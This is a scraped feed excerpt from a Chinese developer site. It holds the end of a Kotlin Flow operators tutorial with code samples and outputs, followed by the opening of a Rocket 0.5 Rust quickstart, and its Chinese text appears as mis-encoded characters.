<span class="hljs-comment">// 1A</span>
<span class="hljs-comment">// 2A</span>
<span class="hljs-comment">// 3A</span>
<span class="hljs-comment">// 3B</span>
</code></pre>
<p>é€‚ç”¨åœºæ™¯ï¼šå“åº”å¤šä¸ªæ•°æ®æºçš„å˜åŒ–ã€‚</p>
<h3 data-id="heading-22">merge</h3>
<p>å°†å¤šä¸ª <code>Flow</code> åˆå¹¶ä¸ºä¸€ä¸ªï¼ŒæŒ‰å‘å‡ºé¡ºåºäº¤é”™è¾“å‡ºæ‰€æœ‰å€¼ã€‚</p>
<pre><code class="hljs language-Kotlin" lang="Kotlin"><span class="hljs-keyword">suspend</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> {
    <span class="hljs-keyword">val</span> flowA = flowOf(<span class="hljs-string">"A1"</span>, <span class="hljs-string">"A2"</span>).onEach { delay(<span class="hljs-number">100</span>) }
    <span class="hljs-keyword">val</span> flowB = flowOf(<span class="hljs-string">"B1"</span>, <span class="hljs-string">"B2"</span>).onEach { delay(<span class="hljs-number">50</span>) }

    merge(flowA, flowB)
        .collect { println(it) }
}

<span class="hljs-comment">// output:</span>
<span class="hljs-comment">// B1</span>
<span class="hljs-comment">// A1</span>
<span class="hljs-comment">// B2</span>
<span class="hljs-comment">// A2</span>
</code></pre>
<p>é€‚ç”¨åœºæ™¯ï¼šå°†æ¥è‡ªä¸åŒ UI ç»„ä»¶çš„å¤šä¸ªäº‹ä»¶æµåˆå¹¶ä¸ºå•ä¸€å¤„ç†æµã€‚</p>
<hr/>
<h2 data-id="heading-23">é”™è¯¯ä¸å®Œæˆå¤„ç†</h2>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/95682e5dd75b4e80af39a6f3fb05b9cc~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgUm9ja0J5dGU=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765939918&amp;x-signature=xwKucKREDlNVuyFwOpiP%2B7lj1lc%3D" alt="7.png" loading="lazy"/></p>
<h3 data-id="heading-24">catch</h3>
<p>æ•è·ä¸Šæ¸¸ <code>Flow</code>ï¼ˆå³ <code>catch</code> ä¹‹å‰çš„æ“ä½œç¬¦ï¼‰ä¸­å‘ç”Ÿçš„å¼‚å¸¸ï¼Œä½†ä¸æ•è·ä¸‹æ¸¸æ”¶é›†å™¨ä¸­çš„å¼‚å¸¸ã€‚</p>
<pre><code class="hljs language-Kotlin" lang="Kotlin"><span class="hljs-keyword">suspend</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> {
    flow {
        emit(<span class="hljs-number">1</span>)
        <span class="hljs-keyword">throw</span> RuntimeException(<span class="hljs-string">"Error!"</span>)
    }
    .<span class="hljs-keyword">catch</span> { e -&gt;
        println(<span class="hljs-string">"Caught: <span class="hljs-subst">${e.message}</span>"</span>)
        emit(-<span class="hljs-number">1</span>) <span class="hljs-comment">// Emit a fallback value</span>
    }
    .collect { println(it) } <span class="hljs-comment">// Emits 1, then -1</span>
}

<span class="hljs-comment">// output:</span>
<span class="hljs-comment">// 1</span>
<span class="hljs-comment">// Caught: Error!</span>
<span class="hljs-comment">// -1</span>
</code></pre>
<p>é€‚ç”¨åœºæ™¯ï¼šä¼˜é›…åœ°å¤„ç†é”™è¯¯ã€æä¾›é»˜è®¤å€¼æˆ–è®°å½•å¤±è´¥ä¿¡æ¯ã€‚</p>
<h3 data-id="heading-25">onCompletion</h3>
<p>åœ¨ <code>Flow</code> å®Œæˆæ—¶ï¼ˆæ— è®ºæˆåŠŸæˆ–å¼‚å¸¸ï¼‰æ‰§è¡ŒæŒ‡å®šæ“ä½œã€‚æˆåŠŸæ—¶ <code>cause</code> ä¸º <code>null</code>ã€‚</p>
<pre><code class="hljs language-Kotlin" lang="Kotlin"><span class="hljs-keyword">suspend</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> {
    (<span class="hljs-number">1.</span><span class="hljs-number">.3</span>).asFlow()
        .onCompletion { cause -&gt;
            <span class="hljs-keyword">if</span> (cause != <span class="hljs-literal">null</span>) println(<span class="hljs-string">"Flow completed with error"</span>)
            <span class="hljs-keyword">else</span> println(<span class="hljs-string">"Flow completed successfully"</span>)
        }
        .collect { println(it) }
}

<span class="hljs-comment">// output:</span>
<span class="hljs-comment">// 1</span>
<span class="hljs-comment">// 2</span>
<span class="hljs-comment">// 3</span>
<span class="hljs-comment">// Flow completed successfully</span>
</code></pre>
<h3 data-id="heading-26">retryWhen</h3>
<p>åœ¨å‘ç”Ÿå¼‚å¸¸æ—¶æ ¹æ®è°“è¯ï¼ˆåŒ…å«å¼‚å¸¸åŸå› å’Œé‡è¯•æ¬¡æ•°ï¼‰å†³å®šæ˜¯å¦é‡è¯•ã€‚</p>
<pre><code class="hljs language-scss" lang="scss">suspend fun <span class="hljs-selector-tag">main</span>() {
    <span class="hljs-selector-tag">var</span> attemptCount = <span class="hljs-number">0</span>
    <span class="hljs-attribute">flow</span> {
        <span class="hljs-built_in">emit</span>(<span class="hljs-number">1</span>)
        if (attemptCount &lt; <span class="hljs-number">2</span>) {
            attemptCount++
            throw <span class="hljs-built_in">RuntimeException</span>("Transient error")
        }
        <span class="hljs-built_in">emit</span>(<span class="hljs-number">2</span>)
    }
    <span class="hljs-selector-class">.retryWhen</span> { cause, attempt -&gt;
        <span class="hljs-built_in">println</span>("Attempt $attempt: Retrying due to ${cause.message}")
        <span class="hljs-built_in">delay</span>(<span class="hljs-number">100</span>) <span class="hljs-comment">// Add a delay before retrying</span>
        attempt &lt; <span class="hljs-number">2</span> <span class="hljs-comment">// Retry up to 2 times</span>
    }
    <span class="hljs-selector-class">.catch</span> { <span class="hljs-built_in">println</span>("Caught final error: ${it.message}") }
    <span class="hljs-selector-class">.collect</span> { <span class="hljs-built_in">println</span>(it) }
}

<span class="hljs-comment">// output:</span>
<span class="hljs-comment">// 1</span>
<span class="hljs-comment">// Attempt 0: Retrying due to Transient error</span>
<span class="hljs-comment">// 1</span>
<span class="hljs-comment">// Attempt 1: Retrying due to Transient error</span>
<span class="hljs-comment">// 1</span>
<span class="hljs-comment">// 2</span>
</code></pre>
<p><code>retryWhen</code> çš„å›è°ƒæœ‰ä¸¤ä¸ªå‚æ•°ï¼š</p>
<ul>
<li><code>cause</code>ï¼šå¯¼è‡´ <code>Flow</code> å¤±è´¥çš„å¼‚å¸¸ï¼ˆ<code>Throwable</code>Â ç±»å‹ï¼‰ã€‚</li>
<li><code>attempt</code>ï¼šå½“å‰æ˜¯ç¬¬å‡ æ¬¡é‡è¯•ï¼Œä»Â <code>0</code>Â å¼€å§‹è®¡æ•°ã€‚</li>
</ul>
<hr/>
<h2 data-id="heading-27">å·¥å…·ä¸å‰¯ä½œç”¨</h2>
<h3 data-id="heading-28">onEach</h3>
<p>å¯¹ <code>Flow</code> ä¸­æ¯ä¸ªå…ƒç´ æ‰§è¡ŒæŒ‡å®šæ“ä½œï¼Œä½†ä¸ä¿®æ”¹å…ƒç´ æœ¬èº«ã€‚</p>
<pre><code class="hljs language-Kotlin" lang="Kotlin"><span class="hljs-keyword">suspend</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> {
    (<span class="hljs-number">1.</span><span class="hljs-number">.3</span>).asFlow()
        .onEach { println(<span class="hljs-string">"About to process <span class="hljs-variable">$it</span>"</span>) }
        .map { it * it }
        .collect { println(<span class="hljs-string">"Processed value: <span class="hljs-variable">$it</span>"</span>) }
}

<span class="hljs-comment">// output:</span>
<span class="hljs-comment">// About to process 1</span>
<span class="hljs-comment">// Processed value: 1</span>
<span class="hljs-comment">// About to process 2</span>
<span class="hljs-comment">// Processed value: 4</span>
<span class="hljs-comment">// About to process 3</span>
<span class="hljs-comment">// Processed value: 9</span>
</code></pre>
<p>é€‚ç”¨åœºæ™¯ï¼šç”¨äºæ—¥å¿—ã€è°ƒè¯•æˆ–åŸ‹ç‚¹ç­‰å‰¯ä½œç”¨åœºæ™¯ï¼Œåœ¨ä¸æ”¹å˜æ•°æ®çš„å‰æä¸‹è§‚å¯Ÿ <code>Flow</code>ã€‚</p>
<h3 data-id="heading-29">debounce</h3>
<p>è¿‡æ»¤åœ¨æŒ‡å®šè¶…æ—¶å†…è¢«æ–°å€¼å–ä»£çš„å€¼ï¼Œä»…å‘å‡ºâ€œçªå‘â€ä¸­çš„æœ€åä¸€ä¸ªå€¼ã€‚</p>
<pre><code class="hljs language-Kotlin" lang="Kotlin"><span class="hljs-keyword">suspend</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> {
    flow {
        emit(<span class="hljs-number">1</span>)
        delay(<span class="hljs-number">90</span>)
        emit(<span class="hljs-number">2</span>)
        delay(<span class="hljs-number">90</span>)
        emit(<span class="hljs-number">3</span>)
        delay(<span class="hljs-number">500</span>)
        emit(<span class="hljs-number">4</span>)
        delay(<span class="hljs-number">90</span>)
        emit(<span class="hljs-number">5</span>)
    }.debounce(<span class="hljs-number">100</span>).collect { println(it) } 
}
<span class="hljs-comment">// output:</span>
<span class="hljs-comment">// 3</span>
<span class="hljs-comment">// 5</span>
</code></pre>
<p>é€‚ç”¨åœºæ™¯ï¼šå¤„ç†å¿«é€Ÿç”¨æˆ·è¾“å…¥ï¼ˆå¦‚æœç´¢æ¡†ï¼‰ï¼Œé¿å…æ¯æ¬¡æŒ‰é”®éƒ½è§¦å‘ API è¯·æ±‚ã€‚</p>
<h3 data-id="heading-30">distinctUntilChanged</h3>
<p>æŠ‘åˆ¶ä¸å‰ä¸€ä¸ªå€¼ç›¸åŒçš„é‡å¤å‘å°„ã€‚</p>
<pre><code class="hljs language-Kotlin" lang="Kotlin"><span class="hljs-keyword">suspend</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> {
    flowOf(<span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">2</span>, <span class="hljs-number">1</span>, <span class="hljs-number">3</span>)
        .distinctUntilChanged()
        .collect { println(it) } 
}

<span class="hljs-comment">// output:</span>
<span class="hljs-comment">// 1</span>
<span class="hljs-comment">// 2</span>
<span class="hljs-comment">// 1</span>
<span class="hljs-comment">// 3</span>
</code></pre>
<p>é€‚ç”¨åœºæ™¯ï¼šé˜²æ­¢ UI å› çŠ¶æ€æœªå˜è€Œè¿›è¡Œä¸å¿…è¦çš„é‡ç»„æˆ–æ›´æ–°ã€‚</p>
<hr/>
<h2 data-id="heading-31">æ ¸å¿ƒå†³ç­–æŒ‡å—</h2>
<ul>
<li>æ•°æ®è½¬æ¢ã€‚ç”¨äºä¿®æ”¹æµä¸­çš„å€¼ï¼š<code>map</code>ï¼Œ<code>filter</code>ï¼Œ<code>distinctUntilChanged</code>ã€‚</li>
<li>ç´¯ç§¯å€¼ã€‚ç”¨äºè·Ÿè¸ªçŠ¶æ€æˆ–è®¡ç®—æŒç»­ç»“æœï¼š<code>scan</code>ï¼Œ<code>runningReduce</code>ï¼Œ<code>fold</code>ï¼Œ<code>reduce</code>ã€‚</li>
<li>ä»å•ä¸€è¾“å…¥å‘å‡ºå¤šä¸ªå€¼ã€‚ç”¨äºè‡ªå®šä¹‰å‘å°„é€»è¾‘ï¼š<code>transform</code>ã€‚</li>
<li>å¤„ç†åµŒå¥—æˆ–åŠ¨æ€ <code>Flow</code>ã€‚æ ¹æ®å†…éƒ¨ <code>Flow</code> è¡Œä¸ºé€‰æ‹©ï¼š<code>flatMapConcat</code>ï¼ˆé¡ºåºæ‰§è¡Œï¼‰ã€<code>flatMapMerge</code>ï¼ˆå¹¶å‘æ‰§è¡Œï¼‰ã€<code>flatMapLatest</code>ï¼ˆå–æ¶ˆæ—§ä»»åŠ¡ï¼Œä¿ç•™æœ€æ–°ï¼‰ã€‚</li>
<li>æ€§èƒ½ä¸èƒŒå‹æ§åˆ¶ã€‚ç”¨äºä¼˜åŒ–æ”¶é›†æ•ˆç‡ä¸å“åº”æ€§ï¼š<code>buffer</code>ï¼Œ<code>conflate</code>ï¼Œ<code>collectLatest</code>ï¼Œ<code>flowOn</code>ã€‚</li>
<li>åˆå¹¶å¤šä¸ªæµã€‚ç”¨äºç»„åˆå¤šä¸ªæ•°æ®æºï¼š<code>zip</code>ï¼ˆæŒ‰é¡ºåºé…å¯¹ï¼‰ã€<code>combine</code>ï¼ˆç»„åˆæœ€æ–°å€¼ï¼‰ã€<code>merge</code>ï¼ˆäº¤é”™åˆå¹¶ï¼‰ã€‚</li>
<li>é”™è¯¯å¤„ç†ä¸å®Œæˆé€»è¾‘ã€‚ç”¨äºåº”å¯¹å¼‚å¸¸å’Œç”Ÿå‘½å‘¨æœŸäº‹ä»¶ï¼š<code>catch</code>ï¼Œ<code>onCompletion</code>ï¼Œ<code>retryWhen</code>ã€‚</li>
<li>è°ƒè¯•ä¸å‰¯ä½œç”¨ã€‚ç”¨äºæ’å…¥æ—¥å¿—æˆ–å‰¯ä½œç”¨æ“ä½œï¼š<code>onEach</code>ã€‚</li>
<li>å¤„ç†é«˜é¢‘å‘å°„ã€‚ç”¨äºæŠ‘åˆ¶è¿‡å¿«çš„å‘å°„é¢‘ç‡ï¼š<code>debounce</code>ã€‚</li>
<li>è§¦å‘ <code>Flow</code> æ‰§è¡Œã€‚ç»ˆç«¯æ“ä½œç¬¦ï¼š<code>collect</code>ï¼Œ<code>collectLatest</code>ï¼Œ<code>first</code>ï¼Œ<code>single</code>ï¼Œ<code>toList</code>ï¼Œ<code>reduce</code>ï¼Œ<code>fold</code>ã€‚</li>
</ul></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Rocket 0.5 å¿«é€Ÿä¸Šæ‰‹ä»å…‹éš†ä»“åº“åˆ°è·‘èµ·ç¬¬ä¸€ä¸ªç¤ºä¾‹]]></title>    <link>https://juejin.cn/post/7581765536372391945</link>    <guid>https://juejin.cn/post/7581765536372391945</guid>    <pubDate>2025-12-10T02:42:39.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7581765536372391945" data-draft-id="7581727073582006323" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Rocket 0.5 å¿«é€Ÿä¸Šæ‰‹ä»å…‹éš†ä»“åº“åˆ°è·‘èµ·ç¬¬ä¸€ä¸ªç¤ºä¾‹"/> <meta itemprop="keywords" content="åç«¯"/> <meta itemprop="datePublished" content="2025-12-10T02:42:39.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="HelloReader"/> <meta itemprop="url" content="https://juejin.cn/user/2601910535729322"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Rocket 0.5 å¿«é€Ÿä¸Šæ‰‹ä»å…‹éš†ä»“åº“åˆ°è·‘èµ·ç¬¬ä¸€ä¸ªç¤ºä¾‹
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2601910535729322/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    HelloReader
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-10T02:42:39.000Z" title="Wed Dec 10 2025 02:42:39 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-10
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»5åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body cache result"><style>.markdown-body{color:#595959;font-size:15px;font-family:-apple-system,system-ui,BlinkMacSystemFont,Helvetica Neue,PingFang SC,Hiragino Sans GB,Microsoft YaHei,Arial,sans-serif;background-image:linear-gradient(90deg,rgba(60,10,30,.04) 3%,transparent 0),linear-gradient(1turn,rgba(60,10,30,.04) 3%,transparent 0);background-size:20px 20px;background-position:50%}.markdown-body p{color:#595959;font-size:15px;line-height:2;font-weight:400}.markdown-body p+p{margin-top:16px}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{padding:30px 0;margin:0;color:#135ce0}.markdown-body h1{position:relative;text-align:center;font-size:22px;margin:50px 0}.markdown-body h1:before{position:absolute;content:"";top:-10px;left:50%;width:32px;height:32px;transform:translateX(-50%);background-size:100% 100%;opacity:.36;background-repeat:no-repeat;background:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAMAAABEpIrGAAAABGdBTUEAALGPC/xhBQAAACBjSFJNAAB6JgAAgIQAAPoAAACA6AAAdTAAAOpgAAA6mAAAF3CculE8AAABfVBMVEX///8Ad/8AgP8AgP8AgP8Aff8AgP8Af/8AgP8AVf8Af/8Af/8AgP8AgP8Af/8Afv8AAP8Afv8Afv8Aef8AgP8AdP8Afv8AgP8AgP8Acf8Ae/8AgP8Af/8AgP8Af/8Af/8AfP8Afv8AgP8Af/8Af/8Afv8Afv8AgP8Afv8AgP8Af/8Af/8AgP8AgP8Afv8AgP8Af/8AgP8AgP8AgP8Ae/8Afv8Af/8AgP8Af/8AgP8Af/8Af/8Aff8Af/8Abf8AgP8Af/8AgP8Af/8Af/8Afv8AgP8AgP8Afv8Afv8AgP8Af/8Aff8AgP8Afv8AgP8Aff8AgP8AfP8AgP8Ae/8AgP8Af/8AgP8AgP8AgP8Afv8AgP8AgP8AgP8Afv8AgP8AgP8AgP8AgP8AgP8Af/8AgP8Af/8Af/8Aev8Af/8AgP8Aff8Afv8AgP8AgP8AgP8Af/8AgP8Af/8Af/8AgP8Afv8AgP8AgP8AgP8AgP8Af/8AeP8Af/8Af/8Af//////rzEHnAAAAfXRSTlMAD7CCAivatxIDx5EMrP19AXdLEwgLR+6iCR/M0yLRzyFF7JupSXn8cw6v60Q0QeqzKtgeG237HMne850/6Qeq7QaZ+WdydHtj+OM3qENCMRYl1B3K2U7wnlWE/mhlirjkODa9FN/BF7/iNV/2kASNZpX1Wlf03C4stRGxgUPclqoAAAABYktHRACIBR1IAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAB3RJTUUH4gEaBzgZ4yeM3AAAAT9JREFUOMvNUldbwkAQvCAqsSBoABE7asSOBRUVVBQNNuy9996789+9cMFAMHnVebmdm+/bmdtbQv4dOFOW2UjPzgFyLfo6nweKfIMOBYWwFtmMPGz2Yj2pJI0JDq3udJW6VVbmKa9I192VQFV1ktXUAl5NB0cd4KpnORqsEO2ZIRpF9gJfE9Dckqq0KuZt7UAH5+8EPF3spjsRpCeQNO/tA/qDwIDA+OCQbBoKA8NOdjMySgcZGVM6jwcgRuUiSs0nlPFNSrEpJfU0jTLD6llqbvKxei7OzvkFNQohi0vAsj81+MoqsCaoPOQFgus/1LyxichW+hS2JWCHZ7VlF9jb187pIAYcHiViHAMnp5mTjJ8B5xeEXF4B1ze/fTh/C0h398DDI9HB07O8ci+vRBdvdGnfP4gBuM8vw7X/G3wDmFhFZEdxzjMAAAAldEVYdGRhdGU6Y3JlYXRlADIwMTgtMDEtMjZUMDc6NTY6MjUrMDE6MDA67pVWAAAAJXRFWHRkYXRlOm1vZGlmeQAyMDE4LTAxLTI2VDA3OjU2OjI1KzAxOjAwS7Mt6gAAABl0RVh0U29mdHdhcmUAd3d3Lmlua3NjYXBlLm9yZ5vuPBoAAAAWdEVYdFRpdGxlAGp1ZWppbl9sb2dvIGNvcHlxapmKAAAAV3pUWHRSYXcgcHJvZmlsZSB0eXBlIGlwdGMAAHic4/IMCHFWKCjKT8vMSeVSAAMjCy5jCxMjE0uTFAMTIESANMNkAyOzVCDL2NTIxMzEHMQHy4BIoEouAOoXEXTyQjWVAAAAAElFTkSuQmCC)}.markdown-body h2{position:relative;font-size:20px;border-left:4px solid;padding:0 0 0 10px;margin:30px 0}.markdown-body h3{font-size:16px}.markdown-body ul{list-style:disc outside;margin-left:2em;margin-top:1em}.markdown-body li{line-height:2;color:#595959}.markdown-body img.loaded{margin:0 auto;display:block}.markdown-body blockquote{background:#fff9f9;margin:2em 0;padding:2px 20px;border-left:4px solid #b2aec5}.markdown-body blockquote p{color:#666;line-height:2}.markdown-body a{color:#036aca;border-bottom:1px solid rgba(3,106,202,.8);font-weight:400;text-decoration:none}.markdown-body em strong,.markdown-body strong{color:#036aca}.markdown-body hr{border-top:1px solid #135ce0}.markdown-body pre{overflow:auto}.markdown-body code,.markdown-body pre{overflow:auto;position:relative;line-height:1.75;font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body table{border-collapse:collapse;margin:1rem 0;overflow-x:auto}.markdown-body table td,.markdown-body table th{border:1px solid #dfe2e5;padding:.6em 1em}.markdown-body table tr{border-top:1px solid #dfe2e5}.markdown-body table tr:nth-child(2n){background-color:#f6f8fa}</style><style data-highlight="">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">ä¸€ã€ç¯å¢ƒå‡†å¤‡ï¼šå…ˆè£…å¥½ Rust å·¥å…·é“¾</h2>
<p>åœ¨å†™ Rocket åº”ç”¨ä¹‹å‰ï¼Œç¬¬ä¸€æ­¥æ˜¯å®‰è£… Rustã€‚Rocket å®˜æ–¹æ¨èä½¿ç”¨ <strong>rustup</strong> æ¥ç®¡ç† Rust ç‰ˆæœ¬ã€‚</p>
<h3 data-id="heading-1">1.1 ä¸ºä»€ä¹ˆæ¨è rustupï¼Ÿ</h3>
<ul>
<li>æ”¯æŒå¤šé€šé“ï¼š<code>stable</code> / <code>beta</code> / <code>nightly</code> å¯ä»¥éšæ—¶åˆ‡æ¢</li>
<li>å¯ä»¥æŒ‰ç›®å½•è¦†ç›–ç‰ˆæœ¬ï¼šæŸä¸ªé¡¹ç›®ç”¨ nightlyï¼Œå…¶ä»–é¡¹ç›®ä»ç„¶ç”¨ stable</li>
<li>æ›´æ–°ã€å¸è½½éƒ½å¾ˆæ–¹ä¾¿ï¼ŒåŸºæœ¬â€œä¸€æ¡å‘½ä»¤æå®šâ€</li>
</ul>
<p>å¦‚æœä½ è¿˜æ²¡å®‰è£… Rustï¼Œå¯ä»¥ç›´æ¥è®¿é—® rustup å®˜ç½‘ï¼ˆrustup.rsï¼‰ï¼ŒæŒ‰é¡µé¢æç¤ºæ‰§è¡Œå®‰è£…å‘½ä»¤ã€‚å®‰è£…å®Œæˆåï¼Œåœ¨ç»ˆç«¯éªŒè¯ï¼š</p>
<pre><code class="hljs language-bash" lang="bash">rustc --version
cargo --version
</code></pre>
<p>ä¸¤ä¸ªå‘½ä»¤éƒ½è¾“å‡ºç‰ˆæœ¬å·ï¼Œå°±è¯´æ˜ç¯å¢ƒæ²¡é—®é¢˜ã€‚</p>
<blockquote>
<p>è¡¥å……ï¼šRocket 0.5 å·²ç»æ”¯æŒ <strong>Rust stable</strong>ï¼Œä½†åœ¨ nightly ä¸Šçš„ç¼–è¯‘é”™è¯¯æç¤ºæ›´å‹å¥½ã€‚ä¸€ä¸ªå¸¸è§å®è·µæ˜¯ï¼š</p>
<ul>
<li>æœ¬åœ°å¼€å‘ï¼šnightlyï¼ˆä½“éªŒæ›´å¥½ï¼‰</li>
<li>çº¿ä¸Šæ„å»ºï¼šstableï¼ˆæ›´ç¨³å®šï¼‰</li>
</ul>
</blockquote>
<h2 data-id="heading-2">äºŒã€æœ€å¿«ä½“éªŒæ–¹å¼ï¼šå…‹éš† Rocket ä»“åº“å¹¶è¿è¡Œç¤ºä¾‹</h2>
<p>Quickstart æ¨èçš„ç¬¬ä¸€æ¡è·¯å¾„ä¸æ˜¯â€œæ–°å»ºé¡¹ç›®â€ï¼Œè€Œæ˜¯ï¼š</p>
<blockquote>
<p><strong>å…‹éš† Rocket æºç ä»“åº“ï¼Œç›´æ¥è·‘ examples é‡Œçš„ä»£ç ã€‚</strong></p>
</blockquote>
<p>å¥½å¤„å¾ˆæ˜æ˜¾ï¼š</p>
<ul>
<li>æ‰€æœ‰æ‰€éœ€ä¾èµ–å·²ç»é…ç½®å¥½</li>
<li>ç¤ºä¾‹è¦†ç›–å¸¸è§åœºæ™¯ï¼Œç›´æ¥è¿è¡Œå³å¯æ„Ÿå—</li>
<li>é‡åˆ°é—®é¢˜æ—¶å¯ä»¥é¡ºå¸¦çœ‹çœ‹æºç å®ç°</li>
</ul>
<h3 data-id="heading-3">2.1 å…‹éš† Rocket ä»“åº“</h3>
<p>åœ¨ç»ˆç«¯æ‰§è¡Œï¼š</p>
<pre><code class="hljs language-bash" lang="bash">git <span class="hljs-built_in">clone</span> https://github.com/rwf2/Rocket
<span class="hljs-built_in">cd</span> Rocket
</code></pre>
<p>ç„¶ååˆ‡æ¢åˆ° 0.5 ç‰ˆæœ¬çš„ tagï¼ˆå’Œæ–‡æ¡£ä¿æŒä¸€è‡´ï¼‰ï¼š</p>
<pre><code class="hljs language-bash" lang="bash">git checkout v0.5
</code></pre>
<p>è¿™æ ·å¯ä»¥é¿å… master åˆ†æ”¯ä¸Šå¯èƒ½å­˜åœ¨çš„â€œæœªæ¥æ”¹åŠ¨â€å¯¼è‡´æ–‡æ¡£ä¸ä»£ç ä¸åŒ¹é…ã€‚</p>
<h3 data-id="heading-4">2.2 è¿è¡Œ hello ç¤ºä¾‹</h3>
<p>æ‰€æœ‰ç¤ºä¾‹éƒ½æ”¾åœ¨ <code>examples/</code> ç›®å½•ä¸‹ï¼Œå…ˆä»æœ€åŸºç¡€çš„ <code>hello</code> å¼€å§‹ï¼š</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-built_in">cd</span> examples/hello
cargo run
</code></pre>
<p>å¦‚æœæ„å»ºæˆåŠŸï¼Œä½ ä¼šåœ¨ç»ˆç«¯çœ‹åˆ°ç±»ä¼¼è¾“å‡ºï¼š</p>
<pre><code class="hljs language-text" lang="text">ğŸš€ Rocket has launched from http://127.0.0.1:8000
</code></pre>
<p>ç”¨æµè§ˆå™¨æ‰“å¼€ï¼š</p>
<pre><code class="hljs language-text" lang="text">http://127.0.0.1:8000
</code></pre>
